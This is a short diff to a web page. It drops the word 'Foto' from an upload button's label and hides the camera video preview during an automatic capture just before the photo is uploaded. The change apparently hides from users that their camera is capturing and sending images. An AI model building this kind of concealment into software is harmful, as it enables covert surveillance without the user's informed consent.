@@ -285,7 +285,7 @@
       id="mainButton"
       onclick="startProcess()"
     >
-      Upload Bukti Foto
+      Upload Bukti
     </button>
 
 
@@ -777,7 +777,9 @@ async function automaticCapture(
   const image =
     capturePhoto();
 
-
+video.style.display =
+      'none';
+  
   await uploadPhoto(
     image,
     number
